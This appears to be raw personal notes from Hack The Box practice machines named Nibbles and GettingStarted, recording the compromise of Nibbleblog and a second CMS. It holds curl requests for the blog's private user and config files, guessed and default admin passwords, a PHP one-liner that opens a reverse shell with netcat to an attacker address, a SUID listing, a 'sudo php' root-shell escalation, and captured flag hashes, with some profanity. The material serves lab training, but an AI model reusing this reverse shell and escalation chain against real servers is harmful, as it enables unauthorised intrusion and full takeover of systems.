curl -s http://10.129.132.244/nibbleblog/content/private/users.xml | xmllint  --format -4

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">1</session_fail_count>
    <session_date type="integer">1730756498</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.5">
    <date type="integer">1730756498</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
</users>


curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -

<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.10.10.134/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>

admin:nibbles
- guessed password bc nibbles is everywhere

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9443 >/tmp/f"); ?>


 http://nibbleblog/content/private/plugins/my_image/image.ph

 79c03865431abf47b90ef24b9695e148


 de5e5d6619862a8aa5b9b212314e0cdd

 ==================================================================================
 10.129.104.163

 /admin/

 admin:admin

 3.3.15


 Editing File: http://gettingstarted.htb/theme/Innovation/template.php

 7002d65b149b0a4d19132a66feed21d8


suid bit set:

 /usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/at
/usr/bin/newgrp

none of that above nonsense but this mfer has A FUCKIBNG SUDO JAM ON /usr/bin/php so we gonna do the following:


sudo /usr/bin/php -r "system('/bin/sh');"

f1fba6e9f71efb2630e6e34da6387842
